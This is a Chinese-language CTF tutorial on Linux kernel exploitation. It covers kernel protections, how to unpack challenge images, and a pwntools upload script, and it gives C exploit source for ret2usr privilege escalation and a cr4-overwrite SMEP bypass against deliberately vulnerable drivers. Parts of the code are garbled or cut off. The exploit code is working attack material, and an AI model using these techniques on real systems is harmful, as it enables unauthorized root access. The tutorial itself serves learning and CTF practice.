# Linux Kernel Pwn 初探
## 基础知识
### kernel 的主要功能：
  1. 控制并与硬件进行交互
  2. 提供 application 能运行的环境
Intel CPU 将 CPU 的特权级别分为 4 个级别：`Ring 0`, `Ring 1`, `Ring 2`, `Ring 3`。
`Ring0` 只给 OS 使用，`Ring 3` 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。
Ps: 在`Ring0`下，可以修改用户的权限（也就是提权）
### 如何进入kernel 态：
  1. 系统调用 `int 0x80` `syscall` `ioctl`
  2. 产生异常
  3. 外设产生中断
  4. ...
### 进入kernel态之前会做什么？
保存用户态的各个寄存器，以及执行到代码的位置
### 从kernel态返回用户态需要做什么？
执行`swapgs`（64位）和 `iret` 指令，当然前提是栈上需要布置好恢复的寄存器的值
### 一般的攻击思路：
寻找kernel 中内核程序的漏洞，之后调用该程序进入内核态，利用漏洞进行提权，提完权后，返回用户态
返回用户态时候的栈布局：
Ps：在返回用户态时，恢复完上述寄存器环境后，还需执行`swapgs`再`iretq`，其中`swapgs`用于置换`GS`寄存器和`KernelGSbase
MSR`寄存器的内容（32位系统中不需要`swapgs`，直接`iret`返回即可）
### Linux Kernel 源码目录结构
`linux-4.20`源码下载：
### CTF中的Linux kernel
通常CTF比赛中`KERNEL PWN`不会直接让选手PWN掉内核，通常漏洞会存在于动态装载模块中(`LKMs`, `Loadable Kernel
Modules` )，包括：
  * 驱动程序（`Device drivers`）
    * 设备驱动
    * 文件系统驱动
    * ...
  * 内核扩展模块 (`modules`)
一般来说，题目会给出如下四个文件：
其中，
  1. `baby.ko` 就是有bug的程序（出题人编译的驱动），可以用`IDA`打开
  2. `bzImage` 是打包的内核，用于启动虚拟机与寻找`gadget`
  3. `Initramfs.cpio` 文件系统
  4. `startvm.sh` 启动脚本
  5. 有时还会有`vmlinux`文件，这是未打包的内核，一般含有符号信息，可以用于加载到`gdb`中方便调试（`gdb vmlinux`），当寻找`gadget`时，使用`objdump -d vmlinux > gadget`然后直接用编辑器搜索会比`ROPgadget`或`ropper`快很多。
  6. 没有`vmlinux`的情况下，可以使用`linux`源码目录下的`scripts/extract-vmlinux`来解压`bzImage`得到`vmlinux`（`extract-vmlinux bzImage > vmlinux`），当然此时的`vmlinux`是不包含调试信息的。
  7. 还有可能附件包中没有驱动程序`*.ko`，此时可能需要我们自己到文件系统中把它提取出来，这里给出`ext4`，`cpio`两种文件系统的提取方法：
    * `ext4`：将文件系统挂载到已有目录。
      * `mkdir ./rootfs`
      * `sudo mount rootfs.img ./rootfs`
      * 查看根目录的`init`或`etc/init.d/rcS`，这是系统的启动脚本
可以看到加载驱动的路径，这时可以把驱动拷出来
      * 卸载文件系统，`sudo umount rootfs`
    * `cpio`：解压文件系统、重打包
      * `mkdir extracted; cd extracted`
      * `cpio -i --no-absolute-filenames -F ../rootfs.cpio`
      * 此时与其它文件系统相同，找到`rcS`文件，查看加载的驱动，拿出来
      * `find . | cpio -o --format=newc > ../rootfs.cpio`
  8. `startvm.sh`用于启动`QEMU`虚拟机，如下：
        #!/bin/bash
    stty intr ^]
    cd `dirname $0`
    timeout --foreground 600 qemu-system-x86_64 \
        -m 64M \
        -nographic \
        -kernel bzImage \
        -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
        -monitor /dev/null \
        -initrd initramfs.cpio \
        -smp cores=1,threads=1 \
        -cpu qemu64 2>/dev/null
可以在最后加上`-gdb tcp::1234 -S`使虚拟机启动时强制中断，等待调试器连接，这里最好用`ubuntu
18.04`，`16.04`有可能出现玄学问题，至少我这里是这样
### Linux Kernel漏洞类型
其中主要有以下几种保护机制：
  * `KPTI`：Kernel PageTable Isolation，内核页表隔离
  * `KASLR`：Kernel Address space layout randomization，内核地址空间布局随机化
  * `SMEP`：Supervisor Mode Execution Prevention，管理模式执行保护
  * `SMAP`：Supervisor Mode Access Prevention，管理模式访问保护
  * `Stack Protector`：Stack Protector又名canary，stack cookie
  * `kptr_restrict`：允许查看内核函数地址
  * `dmesg_restrict`：允许查看`printk`函数输出，用`dmesg`命令来查看
  * `MMAP_MIN_ADDR`：不允许申请`NULL`地址 `mmap(0,....)`
`KASLR`、`Stack
Protector`与用户态下的`ASLR`、`canary`保护机制相似。`SMEP`下，内核态运行时，不允许执行用户态代码；`SMAP`下，内核态不允许访问用户态数据。`SMEP`与`SMAP`的开关都通过`cr4`寄存器来判断，因此可通过修改`cr4`的值来实现绕过`SMEP`，`SMAP`保护。
可以通过`cat /proc/cpuinfo`来查看开启了哪些保护：
`KASLR`、`SMEP`、`SMAP`可通过修改`startvm.sh`来关闭；
`dmesg_restrict`、`dmesg_restrict`可在`rcS`文件中修改：
`MMAP_MIN_ADDR`是`linux`源码中定义的宏，可重新编译内核进行修改（`.config`文件中），默认为4k
## 做题准备
一般来说，不管是什么漏洞，大多数利用都需要一些固定的信息，比如驱动加载基址、`prepare_kernel_cred`地址、`commit_creds`地址（`KASLR`开启时通过偏移计算，内核基址为`0xffffffff81000000`），因此我们需要以`root`权限启动虚拟机，可以在`startvm.sh`中把保护全部关掉。
启动的用户权限也是由`rcS`文件来控制的，找到`setsid`这一行，修改权限为`0000`
启动后，执行`lsmod`可以看到驱动加载基址，要记得先关闭`kaslr`，然后记录下来，这可以用`gdb`调试时方便计算断点地址，这里也可以看到设备名称为`OOB`，路径为`/dev/OOB`。
`cat /proc/kallsyms | grep "prepare_kernel_cred"`得到`prepare_kernel_cred`函数地址
`cat /proc/kallsyms | grep "commit_creds"`得到`commit_creds`函数地址
当我们写好`exp.c`时，需要编译并把它传到本地或远程的`QEMU`虚拟机中，但是由于出题人会使用`busybox`等精简版的系统，所以我们也不能用常规方法。这里给出一个我自己用的脚本，也可以用于本地调试，就不需要重复挂载、打包等操作了。需要安装`muslgcc`（`apt
install musl-tools`）
    from pwn import *
    #context.update(log_level='debug')
    HOST = "10.112.100.47"
    PORT =  1717
    USER = "pwn"
    PW = "pwn"
    def compile():
        log.info("Compile")
        os.system("musl-gcc -w -s -static -o3 oob.c -o exp")
    def exec_cmd(cmd):
        r.sendline(cmd)
        r.recvuntil("$ ")
    def upload():
        p = log.progress("Upload")
        with open("exp", "rb") as f:
            data = f.read()
        encoded = base64.b64encode(data)
        r.recvuntil("$ ")
        for i in range(0, len(encoded), 300):
            p.status("%d / %d" % (i, len(encoded)))
            exec_cmd("echo \"%s\" >> benc" % (encoded[i:i+300]))
        exec_cmd("cat benc | base64 -d > bout")
        exec_cmd("chmod +x bout")
        p.success()
    def exploit(r):
        compile()
        upload()
        r.interactive()
        return
    if __name__ == "__main__":
        if len(sys.argv) > 1:
            session = ssh(USER, HOST, PORT, PW)
            r = session.run("/bin/sh")
            exploit(r)
        else:
            r = process("./startvm.sh")
            print util.proc.pidof(r)
            pause()
            exploit(r)
## level1
第一道例题，程序很简单，只有一个函数
`init_module`中注册了名叫`baby`的驱动
`sub_0`函数存在栈溢出，将`0x100`的用户数据拷贝到内核栈上，高度只有`0x88`
这里实际上缓冲区距离`rbp`是`0x80`，也没有保护，不用泄露，不用绕过，直接`ret2usr`
`exp.c`：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
    void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it
    unsigned long user_cs, user_ss, user_rflags, user_sp;
    void save_stat() {
        asm(
            "movq %%cs, %0;"
            "movq %%ss, %1;"
            "movq %%rsp, %2;"
            "pushfq;"
            "popq %3;"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    }
    void templine()
    {
      commit_creds(prepare_kernel_cred(0));
      asm(
        "pushq   %0;"
        "pushq   %1;"
        "pushq   %2;"
        "pushq   %3;"
        "pushq   $shell;"
        "pushq   $0;"
        "swapgs;"
        "popq    %%rbp;"
        "iretq;"
        ::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
    }
    void shell()
    {
            printf("root\n");
            system("/bin/sh");
            exit(0);
    }
    int main() {
      void *buf[0x100];
      save_stat();
      int fd = open("/dev/baby", 0);
        if (fd  vmlinux
然后用`objdump`提取`gadget`
    objdump -d ./vmlinux > gadget
找合适的`rop`链，这里可以先看可控制`cr4`的寄存器，再找相关的`pop`链
然后就可以修改`cr4`为`0x6f0`，后面就是常规操作了
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
    void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it
    unsigned long long user_cs, user_ss, user_rflags, user_sp;
    unsigned long long base_addr, canary;
    void save_stat() {
        asm(
            "movq %%cs, %0;"
            "movq %%ss, %1;"
            "movq %%rsp, %2;"
            "pushfq;"
            "popq %3;"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    }
    void templine()
    {
      commit_creds(prepare_kernel_cred(0));
      asm(
        "pushq   %0;"
        "pushq   %1;"
        "pushq   %2;"
        "pushq   %3;"
        "pushq   $shell;"
        "pushq   $0;"
        "swapgs;"
        "popq    %%rbp;"
        "iretq;"
        ::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
    }
    void shell()
    {
            printf("root\n");
            system("/bin/sh");
            exit(0);
    }
    unsigned long long int calc(unsigned long long int addr) {
        return addr-0xffffffff81000000+base_addr;
    }
    int main() {
      long long buf[0x200];
      save_stat();
      int fd = open("/dev/baby", 0);
        if (fd < 0) {
            printf("[-] bad open device\n");
            exit(-1);
        }
        // for(int i=0; i<0x100; i++) {
        //  buf[i] = &templine;
        // }